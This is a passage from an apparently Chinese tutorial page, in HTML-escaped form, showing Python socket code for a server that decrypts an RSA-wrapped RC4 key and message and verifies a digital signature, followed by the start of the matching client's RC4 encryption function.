接收客户端的公钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    client_public_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4096&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;已收到客户端的公钥:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; client_public_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 将服务器的签名公钥发送给客户端&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;public_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;服务器签名公钥已发送给客户端:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; public_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 导入客户端的公钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    rsa_client_public_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; RSA&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;import_key&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;client_public_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#提取出 n 和 e&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 接收客户端发送的加密的 RC4 密钥和消息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    encrypted_data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4096&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    encrypted_rc4_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; encrypted_data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    encrypted_message &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; encrypted_data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;已接收加密RC4密钥和加密消息。&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;接收到的RC4密钥为:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; encrypted_rc4_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;接收的RC4加密消息为:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; encrypted_message&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 使用服务器的私钥解密 RC4 密钥&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    rsa_cipher &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; PKCS1_OAEP&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;new&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    rc4_key &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; rsa_cipher&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;encrypted_rc4_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;已使用服务器的私钥解密RC4密钥。&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 使用 RC4 密钥解密消息&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    decrypted_message &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; rc4_decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rc4_key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; encrypted_message&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;已解密加密消息。&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;解密后的消息:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; decrypted_message&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;80&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;81&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 接收来自客户端的数字签名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;82&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    signature &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4096&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;83&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;已接收数字签名。&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;84&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;85&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 验证数字签名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;86&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    hash_obj &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; SHA256&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;new&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;encrypted_message&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;87&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;88&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        pkcs1_15&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;new&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rsa_client_public_key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;verify&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hash_obj&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; signature&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;89&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;数字签名验证通过。&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;90&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;except&lt;/span&gt; ValueError &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;91&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;数字签名验证失败：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;92&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;93&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 向客户端发送响应&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;94&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    response &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;已收到消息。&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;encode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;95&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendall&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;response&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;96&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;97&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 关闭客户端连接&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;98&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    client_socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;close&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;客户端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#客户端&#34;&gt;#&lt;/a&gt; 客户端&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; socket&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; random&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PublicKey &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; RSA&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Cipher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; PKCS1_OAEP&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Hash &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; SHA256&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Signature &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; pkcs1_15&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;rc4_encrypt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; plaintext&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    S &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    out &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 初始化 S 盒&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;j &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; key&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;key&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; S&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 生成密钥流并加密明文&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; char &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; plaintext&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        j &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;j &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; S&lt;span 